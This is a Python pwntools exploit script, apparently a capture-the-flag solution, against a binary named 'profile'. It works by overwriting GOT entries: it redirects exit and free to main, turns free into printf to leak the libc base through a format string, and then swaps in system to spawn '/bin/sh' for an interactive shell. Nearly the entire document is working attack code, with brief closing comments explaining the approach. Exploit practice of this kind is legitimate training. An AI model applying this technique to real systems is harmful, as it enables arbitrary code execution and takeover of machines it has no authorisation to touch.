from pwn import *

import warnings
warnings.simplefilter("ignore", category = BytesWarning)

context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("./profile")
libc = ELF("./libc.so.6")

gdbscript = f"""
file {elf.path}
b *0x000000000040145c
"""

if args.REMOTE:
	p = remote("127.0.0.1", 5000)
else:
	p = process(["./ld.so", "--library-path", ".", elf.path], aslr = False)
	# gdb.attach(p, gdbscript = gdbscript)
	# pause()

# offsets:
libc_leak = 0x29d90	# offset of the libc address we leak with formatstr from libc base

def write_got(what, where):
	p.recvuntil("Age: ")
	p.sendline(str(where << 32))	# write the target address into employee.name
	p.recvuntil("Name: ")
	p.send(p64(what).rstrip(b"\0") + b"\n")

write_got(elf.sym["main"], elf.got["free"])	# to prevent calling free() on our arbitrary employee.name (which will segfault)
write_got(elf.sym["main"], elf.got["exit"])	# repeat the vulnerability by calling main() again
write_got(elf.plt["printf"], elf.got["free"])	# creating a format string vulnerability to leak stuff

# Leaking libc base through format string
p.recvuntil("Age: ")
p.sendline("123")
p.recvuntil("Name: ")
p.sendline("|%29$p|")
p.recvuntil("----------------")
p.recvuntil("----------------")
p.recvuntil("|")
libc.address = int(p.recvuntil("|")[:-1], 16) - libc_leak
log.success("libc base = " + hex(libc.address))

# getting the shell :)
write_got(libc.sym["system"], elf.got["free"])
p.sendlineafter("Age: ", "123")
p.sendlineafter("Name: ", "/bin/sh")

p.interactive()

# Main idea: we write address of main() in the GOT of a function called in the end of main (exit) to have infinite tries.
# Then we write printf@plt at free@got to have a format string (because we can control the data inside the pointer passed to free).
# Then with the format string we can leak everything and win :)
